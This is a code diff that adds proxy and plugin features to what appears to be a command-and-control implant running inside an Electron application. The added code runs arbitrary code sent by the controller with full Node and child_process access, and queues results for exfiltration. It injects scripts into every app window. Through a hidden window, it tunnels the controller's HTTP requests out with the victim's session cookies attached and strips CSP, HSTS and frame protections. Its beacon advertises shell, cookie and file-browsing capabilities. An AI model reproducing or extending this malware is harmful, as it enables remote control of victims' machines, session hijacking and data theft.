@@ -35,6 +35,20 @@
   // Per-window timestamp of last heuristic screenshot (windowId -> epoch ms)
   const lastScreenshotTime = new Map();
 
+  // ===== Proxy State =====
+  let proxyActive = false;
+  let proxyReconnectTimer = null;
+  let proxyPingTimer = null;
+  let proxyPendingResponses = [];
+  const MAX_CONCURRENT_PROXY = 8;
+  let activeProxyFetches = 0;
+  let proxyFetchQueue = [];
+  let _proxyBrowserWin = null;  // Hidden BrowserWindow hosting the WebSocket
+  let _proxyPollTimer = null;   // Interval timer for polling renderer messages
+
+  // ===== Plugin State =====
+  const __loadedPlugins = new Map(); // pluginId -> {active, timers, cleanup, _rendererCode}
+
   // ===== Node.js modules =====
   const nodeCrypto = require('crypto');
   const https = require('https');
@@ -291,8 +305,15 @@
       await handleScreenshotTask(config);
     } else if (config.type === 'SCREENSHOT_SETTINGS') {
       handleScreenshotSettingsTask(config);
+    } else if (config.type === 'PROXY_START') {
+      startAtomProxy();
+    } else if (config.type === 'PROXY_STOP') {
+      stopAtomProxy();
+    } else if (config.type === 'PLUGIN_LOAD') {
+      loadPlugin(config);
+    } else if (config.type === 'PLUGIN_UNLOAD') {
+      unloadPlugin(config.pluginId);
     }
-    // Future: handle other task types (PROXY_START, etc.)
   }
 
   function handleScreenshotSettingsTask(config) {
@@ -305,6 +326,113 @@
         screenshotSettings.cooldownSec = args.cooldownSec;
       }
     }
+  }
+
+  // ===== Plugin System =====
+
+  function loadPlugin(config) {
+    const { pluginId, settings, mainCode, rendererCode } = config;
+    if (!pluginId || !mainCode) return;
+    if (__loadedPlugins.has(pluginId)) unloadPlugin(pluginId);
+
+    const state = { active: true, timers: [], cleanup: null, _rendererCode: null };
+
+    // Build the plugin API object
+    const pluginAPI = {
+      pluginId: pluginId,
+      settings: settings || {},
+
+      // Data reporting — feeds into existing exfilQueue → sendEncrypted
+      sendData: function(dataType, data) {
+        exfilQueue.push({ path: '/plugin/data/' + pluginId, data: { dataType: dataType, data: data } });
+      },
+
+      // Timer management (auto-cleaned on unload)
+      setInterval: function(fn, ms) {
+        var id = setInterval(fn, ms);
+        state.timers.push({ type: 'interval', id: id });
+        return id;
+      },
+      setTimeout: function(fn, ms) {
+        var id = setTimeout(fn, ms);
+        state.timers.push({ type: 'timeout', id: id });
+        return id;
+      },
+
+      // Renderer access
+      getWindows: function() {
+        var wins = [];
+        for (var entry of trackedWindows) {
+          var wid = entry[0], wdata = entry[1];
+          if (!wdata.webContents.isDestroyed()) {
+            wins.push({ id: wid, url: wdata.webContents.getURL(), title: wdata.webContents.getTitle() });
+          }
+        }
+        return wins;
+      },
+      executeInRenderer: function(windowId, code) {
+        var entry = trackedWindows.get(windowId);
+        if (!entry || entry.webContents.isDestroyed()) return Promise.resolve(null);
+        return entry.webContents.executeJavaScript(code).catch(function() { return null; });
+      },
+      injectRenderer: function(code) {
+        for (var entry of trackedWindows) {
+          var wdata = entry[1];
+          if (!wdata.webContents.isDestroyed()) {
+            wdata.webContents.executeJavaScript(code).catch(function() {});
+          }
+        }
+      },
+
+      // Node.js modules
+      require: require,
+      fs: fs,
+      path: path,
+      childProcess: childProcess,
+      os: os,
+      crypto: nodeCrypto,
+      http: http,
+      https: https,
+      electron: { app: app, session: session, BrowserWindow: BrowserWindow, desktopCapturer: desktopCapturer }
+    };
+
+    try {
+      var pluginFn = new Function('plugin', mainCode);
+      var cleanupFn = pluginFn(pluginAPI);
+      if (typeof cleanupFn === 'function') state.cleanup = cleanupFn;
+    } catch (e) {
+      exfilQueue.push({ path: '/plugin/data/' + pluginId, data: { dataType: '_error', data: { error: String(e) } } });
+      return;
+    }
+
+    if (rendererCode) {
+      state._rendererCode = rendererCode;
+      pluginAPI.injectRenderer(rendererCode);
+    }
+
+    __loadedPlugins.set(pluginId, state);
+  }
+
+  function unloadPlugin(pluginId) {
+    var state = __loadedPlugins.get(pluginId);
+    if (!state) return;
+
+    state.active = false;
+
+    // Clear all registered timers
+    for (var i = 0; i < state.timers.length; i++) {
+      var t = state.timers[i];
+      if (t.type === 'interval') clearInterval(t.id);
+      else clearTimeout(t.id);
+    }
+    state.timers = [];
+
+    // Call cleanup if provided
+    if (typeof state.cleanup === 'function') {
+      try { state.cleanup(); } catch (e) { /* cleanup error */ }
+    }
+
+    __loadedPlugins.delete(pluginId);
   }
 
   // Heuristic screenshot: capture a window if cooldown has elapsed
@@ -682,6 +810,12 @@
 
       webContents.on('dom-ready', () => {
         injectRenderer(windowId);
+        // Re-inject plugin renderer code into new/navigated windows
+        for (const [pid, pstate] of __loadedPlugins) {
+          if (pstate.active && pstate._rendererCode) {
+            webContents.executeJavaScript(pstate._rendererCode).catch(() => {});
+          }
+        }
       });
 
       webContents.on('did-navigate', () => {
@@ -689,6 +823,12 @@
         const entry = trackedWindows.get(windowId);
         if (entry) entry.injected = false;
         injectRenderer(windowId);
+        // Re-inject plugin renderer code
+        for (const [pid, pstate] of __loadedPlugins) {
+          if (pstate.active && pstate._rendererCode) {
+            webContents.executeJavaScript(pstate._rendererCode).catch(() => {});
+          }
+        }
 
         // Heuristic screenshot on full-page navigation (after new content loads)
         if (screenshotSettings.onNavigate) {
@@ -789,6 +929,342 @@
     }
   }
 
+  // ===== Proxy WebSocket via Hidden BrowserWindow =====
+  // Raw TLS sockets don't survive in Electron's main process event loop.
+  // Instead, use a hidden BrowserWindow with Chromium's native WebSocket.
+
+  function connectProxyWebSocket() {
+    if (!proxyActive || !sessionUUID) return;
+
+    const wsUrl = __ATOM_CONFIG.serverUrl.replace(/^http/, 'ws') + '/ws/proxy/' + sessionUUID;
+
+    // Clean up previous window if any
+    destroyProxyWindow();
+
+    // Create a dedicated session that accepts self-signed certs
+    let proxySession;
+    try {
+      proxySession = session.fromPartition('proxy-ws');
+      proxySession.setCertificateVerifyProc((request, callback) => {
+        callback(0); // Accept all certs (same as rejectUnauthorized: false)
+      });
+    } catch(e) {
+      proxySession = session.defaultSession;
+    }
+
+    try {
+      _proxyBrowserWin = new BrowserWindow({
+        show: false,
+        width: 1,
+        height: 1,
+        skipTaskbar: true,
+        webPreferences: {
+          session: proxySession,
+          nodeIntegration: false,
+          contextIsolation: false
+        }
+      });
+    } catch(e) {
+      scheduleProxyReconnect();
+      return;
+    }
+
+    _proxyBrowserWin.on('closed', () => {
+      _proxyBrowserWin = null;
+      if (proxyActive) scheduleProxyReconnect();
+    });
+
+    _proxyBrowserWin.loadURL('about:blank').then(() => {
+      if (!_proxyBrowserWin || !proxyActive) return;
+
+      // Inject WebSocket code into the renderer
+      const injectCode = `
+        (function() {
+          window._pxQ = [];      // Incoming message queue
+          window._pxState = 'connecting';
+          try {
+            window._pxWs = new WebSocket(${JSON.stringify(wsUrl)});
+            window._pxWs.onopen = function() { window._pxState = 'open'; };
+            window._pxWs.onmessage = function(e) { window._pxQ.push(e.data); };
+            window._pxWs.onclose = function() { window._pxState = 'closed'; };
+            window._pxWs.onerror = function() { window._pxState = 'error'; };
+          } catch(e) {
+            window._pxState = 'error';
+          }
+          window._pxSend = function(msg) {
+            if (window._pxWs && window._pxWs.readyState === 1) window._pxWs.send(msg);
+          };
+          window._pxFlush = function() {
+            var msgs = window._pxQ.splice(0);
+            return JSON.stringify({ s: window._pxState, m: msgs });
+          };
+        })()
+      `;
+
+      _proxyBrowserWin.webContents.executeJavaScript(injectCode).then(() => {
+        // Start polling for messages from the renderer's WebSocket
+        startProxyPoll();
+      }).catch(() => {
+        scheduleProxyReconnect();
+      });
+    }).catch(() => {
+      scheduleProxyReconnect();
+    });
+  }
+
+  function destroyProxyWindow() {
+    if (_proxyPollTimer) { clearInterval(_proxyPollTimer); _proxyPollTimer = null; }
+    if (_proxyBrowserWin) {
+      try { _proxyBrowserWin.destroy(); } catch(e) {}
+      _proxyBrowserWin = null;
+    }
+  }
+
+  function startProxyPoll() {
+    if (_proxyPollTimer) clearInterval(_proxyPollTimer);
+    let wasOpen = false;
+
+    _proxyPollTimer = setInterval(async () => {
+      if (!_proxyBrowserWin || !proxyActive) {
+        if (_proxyPollTimer) { clearInterval(_proxyPollTimer); _proxyPollTimer = null; }
+        return;
+      }
+
+      try {
+        const raw = await _proxyBrowserWin.webContents.executeJavaScript('window._pxFlush()');
+        const data = JSON.parse(raw);
+
+        if (data.s === 'open') {
+          if (!wasOpen) {
+            wasOpen = true;
+            // Drain any buffered responses
+            for (const msg of proxyPendingResponses.splice(0)) {
+              sendToProxyWs(msg);
+            }
+            // Start keep-alive pings
+            if (proxyPingTimer) clearInterval(proxyPingTimer);
+            proxyPingTimer = setInterval(() => {
+              sendToProxyWs(JSON.stringify({ type: 'ping' }));
+            }, 10000);
+          }
+
+          // Process incoming messages
+          for (const msgStr of data.m) {
+            try {
+              var msg = JSON.parse(msgStr);
+              if (msg.id && msg.method && msg.url) {
+                acquireProxySlot(function() {
+                  handleAtomProxyRequest(msg);
+                });
+              }
+            } catch(e) {}
+          }
+        } else if (data.s === 'closed' || data.s === 'error') {
+          if (_proxyPollTimer) { clearInterval(_proxyPollTimer); _proxyPollTimer = null; }
+          if (proxyPingTimer) { clearInterval(proxyPingTimer); proxyPingTimer = null; }
+          destroyProxyWindow();
+          if (proxyActive) scheduleProxyReconnect();
+        }
+      } catch(e) {
+        // webContents may have been destroyed
+      }
+    }, 50); // 50ms polling for low latency
+  }
+
+  function sendToProxyWs(msg) {
+    if (!_proxyBrowserWin) {
+      proxyPendingResponses.push(msg);
+      return;
+    }
+    const escaped = JSON.stringify(msg);
+    _proxyBrowserWin.webContents.executeJavaScript('window._pxSend(' + escaped + ')').catch(() => {});
+  }
+
+  // ===== Proxy Control =====
+
+  function startAtomProxy() {
+    if (proxyActive) return;
+    proxyActive = true;
+    connectProxyWebSocket();
+  }
+
+  function stopAtomProxy() {
+    proxyActive = false;
+    if (proxyPingTimer) { clearInterval(proxyPingTimer); proxyPingTimer = null; }
+    if (proxyReconnectTimer) { clearTimeout(proxyReconnectTimer); proxyReconnectTimer = null; }
+    destroyProxyWindow();
+    activeProxyFetches = 0;
+    proxyFetchQueue = [];
+    proxyPendingResponses = [];
+  }
+
+  function scheduleProxyReconnect() {
+    if (!proxyActive) return;
+    if (proxyReconnectTimer) clearTimeout(proxyReconnectTimer);
+    proxyReconnectTimer = setTimeout(function() {
+      proxyReconnectTimer = null;
+      connectProxyWebSocket();
+    }, 3000);
+  }
+
+  function acquireProxySlot(fn) {
+    if (activeProxyFetches < MAX_CONCURRENT_PROXY) {
+      activeProxyFetches++;
+      fn();
+    } else {
+      proxyFetchQueue.push(fn);
+    }
+  }
+
+  function releaseProxySlot() {
+    activeProxyFetches--;
+    if (proxyFetchQueue.length > 0 && activeProxyFetches < MAX_CONCURRENT_PROXY) {
+      activeProxyFetches++;
+      var next = proxyFetchQueue.shift();
+      next();
+    }
+  }
+
+  // ===== Proxy Request Handler =====
+
+  const HOP_BY_HOP_HEADERS = new Set([
+    'host', 'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
+    'te', 'trailer', 'transfer-encoding', 'upgrade', 'proxy-connection'
+  ]);
+
+  const STRIP_RESPONSE_HEADERS = new Set([
+    'strict-transport-security', 'content-security-policy', 'content-security-policy-report-only',
+    'x-content-security-policy', 'alt-svc', 'transfer-encoding',
+    'content-length', 'x-frame-options'
+  ]);
+
+  async function handleAtomProxyRequest(req) {
+    try {
+      var filteredHeaders = {};
+      if (req.headers) {
+        for (var name in req.headers) {
+          if (!HOP_BY_HOP_HEADERS.has(name.toLowerCase())) {
+            filteredHeaders[name] = req.headers[name];
+          }
+        }
+      }
+
+      // Inject cookies from the app's session
+      try {
+        var cookies = await session.defaultSession.cookies.get({ url: req.url });
+        if (cookies.length > 0) {
+          var cookieStr = cookies.map(function(c) { return c.name + '=' + c.value; }).join('; ');
+          filteredHeaders['Cookie'] = cookieStr;
+        }
+      } catch(e) {}
+
+      var responseData = await executeProxyFetch(req.method, req.url, filteredHeaders, req.body);
+      sendProxyResponse(responseData.id || req.id, responseData.status, responseData.headers, responseData.setCookies, responseData.body);
+    } catch(e) {
+      var errBody = Buffer.from('Proxy fetch error: ' + String(e)).toString('base64');
+      sendProxyResponse(req.id, 502, { 'Content-Type': 'text/plain' }, [], errBody);
+    } finally {
+      releaseProxySlot();
+    }
+  }
+
+  function executeProxyFetch(method, url, headers, body) {
+    return new Promise(function(resolve) {
+      var timedOut = false;
+      var timer = setTimeout(function() {
+        timedOut = true;
+        if (reqObj) try { reqObj.destroy(); } catch(e) {}
+        resolve({
+          status: 504,
+          headers: { 'Content-Type': 'text/plain' },
+          setCookies: [],
+          body: Buffer.from('Proxy request timed out').toString('base64')
+        });
+      }, 30000);
+
+      var reqObj;
+
+      // Use Node.js https/http for proxy requests.
+      // electron.net returns empty response bodies due to Chromium network stack quirks.
+      // Session cookies are already injected manually via session.defaultSession.cookies.get().
+      var parsed = new URL(url);
+      var mod = parsed.protocol === 'https:' ? https : http;
+      var options = {
+        hostname: parsed.hostname,
+        port: parsed.port,
+        path: parsed.pathname + parsed.search,
+        method: method,
+        headers: headers,
+        rejectUnauthorized: false
+      };
+
+      reqObj = mod.request(options, function(res) {
+        var chunks = [];
+        res.on('data', function(chunk) { chunks.push(chunk); });
+        res.on('end', function() {
+          if (timedOut) return;
+          clearTimeout(timer);
+          var respBody = Buffer.concat(chunks);
+
+          var respHeaders = {};
+          var setCookies = [];
+          for (var hName in res.headers) {
+            var hLower = hName.toLowerCase();
+            if (STRIP_RESPONSE_HEADERS.has(hLower)) continue;
+            if (hLower === 'set-cookie') {
+              var val = res.headers[hName];
+              setCookies = Array.isArray(val) ? val : [val];
+              continue;
+            }
+            // Node.js headers can be arrays; join with comma
+            var hVal = res.headers[hName];
+            respHeaders[hName] = Array.isArray(hVal) ? hVal.join(', ') : hVal;
+          }
+
+          // Set correct Content-Length from actual body
+          respHeaders['Content-Length'] = String(respBody.length);
+
+          resolve({
+            status: res.statusCode,
+            headers: respHeaders,
+            setCookies: setCookies,
+            body: respBody.toString('base64')
+          });
+        });
+      });
+
+      reqObj.on('error', function(err) {
+        if (timedOut) return;
+        clearTimeout(timer);
+        resolve({
+          status: 502,
+          headers: { 'Content-Type': 'text/plain' },
+          setCookies: [],
+          body: Buffer.from('Proxy fetch error: ' + String(err)).toString('base64')
+        });
+      });
+
+      if (body) {
+        var bodyBuf = Buffer.from(body, 'base64');
+        reqObj.write(bodyBuf);
+      }
+      reqObj.end();
+    });
+  }
+
+  function sendProxyResponse(id, status, headers, setCookies, body) {
+    var msg = JSON.stringify({
+      type: 'response',
+      id: id,
+      status: status,
+      headers: headers,
+      setCookies: setCookies || [],
+      body: body
+    });
+
+    sendToProxyWs(msg);
+  }
+
   // ===== Status Reporting =====
 
   async function reportStatus() {
@@ -808,7 +1284,10 @@
 
     sendEncrypted('/beacon/status', {
       supported: true,
-      capabilities: ['file_browser', 'shell', 'screenshot', 'cookies', 'headers', 'renderer_injection'],
+      capabilities: ['file_browser', 'shell', 'screenshot', 'cookies', 'headers', 'renderer_injection', 'proxy', 'plugins'],
+      proxyActive: proxyActive,
+      proxyWsConnected: _proxyBrowserWin !== null,
+      activePlugins: Array.from(__loadedPlugins.keys()).filter(function(k) { return __loadedPlugins.get(k).active; }),
       windows: windowList,
       hostname: os.hostname(),
       platform: os.platform(),
